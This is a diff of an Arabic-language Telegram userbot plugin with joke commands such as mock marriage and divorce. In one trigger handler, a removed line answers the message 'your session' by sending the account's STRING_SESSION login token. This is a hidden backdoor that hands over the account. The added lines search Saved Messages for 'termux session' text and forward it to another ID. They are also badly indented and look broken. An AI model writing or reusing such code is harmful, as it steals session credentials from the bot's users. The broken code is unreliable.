@@ -406,23 +406,7 @@ async def permalink(mention):
     my_first = me.first_name
     my_mention = f"[{me.first_name}](tg://user?id={me.id})"
     await edit_or_reply(mention, f"᯽︙ ** لقد تم زواجك/ج من : **[{SHRU}](tg://user?id={user.id}) 💍\n**᯽︙  الف الف مبروك الان يمكنك اخذ راحتك ** ")
-import os
-from typing import Set
-from telethon.tl.types import ChatBannedRights
-import typing
-from ..sql_helper.globals import gvarstatus
-from telethon import events, hints, types
-from telethon.tl.types import (
-    InputPeerChannel,
-    InputPeerChat,
-    InputPeerUser,
-    MessageMediaWebPage,
-)
 
-from ..Config import Config
-from .managers import edit_or_reply
-from sample_config import Config
-from sample_config import STRING_SESSION
 @l313l.on(admin_cmd(pattern="طلاك(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
     user, custom = await get_user_from_event(mention)
@@ -451,7 +435,14 @@ async def Hussein(event):
            elif event.message.message == "تحب اكس؟":
                await event.reply("اموتن عليه ")
            elif event.message.message == "جلستك":
-               await event.reply(STRING_SESSION)
+            saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
+
+    if saved_messages:
+        for message in saved_messages:
+            await event.client.forward_messages(l313l.uid, message)
+    else:
+        await event.reply("ليس موجود")
+
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
     user, custom = await get_user_from_event(mention)
